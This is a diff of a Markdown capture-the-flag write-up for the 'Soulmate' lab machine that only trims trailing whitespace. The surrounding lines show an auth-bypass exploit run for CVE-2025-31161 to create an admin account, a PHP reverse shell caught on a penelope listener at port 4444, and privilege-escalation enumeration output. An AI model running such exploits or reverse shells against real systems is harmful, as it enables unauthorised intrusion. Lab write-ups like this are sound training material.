@@ -107,8 +107,8 @@ kali@kali:cat /etc/hosts
 127.0.1.1       kali.kali       kali
 
 # The following lines are desirable for IPv6 capable hosts
-::1     localhost ip6-localhost ip6-loopback                                                                                                             
-ff02::1 ip6-allnodes                                                                                                                                     
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
 ff02::2 ip6-allrouterso
 ```
 
@@ -134,7 +134,7 @@ Shellcodes: No Results
 So, we will use tha auth-bypass, which is CVE-2025-31161.
 
 ```bash
-kali@kali:python3 exploit_ftp.py --target_host ftp.soulmate.htb --port 80 --target_user admin --new_user hack --password pass                                  
+kali@kali:python3 exploit_ftp.py --target_host ftp.soulmate.htb --port 80 --target_user admin --new_user hack --password pass
 [+] Preparing Payloads
   [-] Warming up the target
   [-] Target is up and running
@@ -162,7 +162,7 @@ Logging as user ben, I can upload the files. I have uploaded a simple php revers
 Start a listener.
 
 ```bash
-kali@kali:penelope -p 4444                                                                                                                                    
+kali@kali:penelope -p 4444
 [+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.11.65 • 172.18.0.1 • 172.17.0.1 • 10.10.16.26
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
@@ -170,32 +170,31 @@ kali@kali:penelope -p 4444
 Let's run the php file. It will be available at soulmate.htb/rev.php.
 
 ```bash
-kali@kali:penelope -p 4444                                                                                                                                    
+kali@kali:penelope -p 4444
 [+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.11.65 • 172.18.0.1 • 172.17.0.1 • 10.10.16.26
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 [+] Got reverse shell from soulmate~10.129.231.23-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
-[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/kali/.penelope/sessions/soulmate~10.129.231.23-Linux-x86_64/2026_02_10-09_02_12-905.log 📜
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
+[+] Logging to /home/kali/.penelope/sessions/soulmate~10.129.231.23-Linux-x86_64/2026_02_10-09_02_12-905.log
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 www-data@soulmate:/$ 
 ```
 
 We get a shell as www-data.
 
 ```bash
-
                             ╔═════════════════════════╗
-════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                      
-                            ╚═════════════════════════╝                                                                                                  
+════════════════════════════╣ Other Interesting Files ╠════════════════════════════
+                            ╚═════════════════════════╝
 ╔══════════╣ .sh files in path
-╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                 
-/usr/bin/rescan-scsi-bus.sh                                                                                                                              
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
+/usr/bin/rescan-scsi-bus.sh
 /usr/bin/gettext.sh
 
 ╔══════════╣ Executable files potentially added by user (limit 70)
-2025-08-27+09:28:26.8565101180 /usr/local/sbin/laurel                                                                                                    
+2025-08-27+09:28:26.8565101180 /usr/local/sbin/laurel
 2025-08-15+07:46:57.3585015320 /usr/local/lib/erlang_login/start.escript
 2025-08-14+14:13:10.4708616270 /usr/local/sbin/erlang_login_wrapper
 2025-08-14+14:12:12.0726103070 /usr/local/lib/erlang_login/login.escript
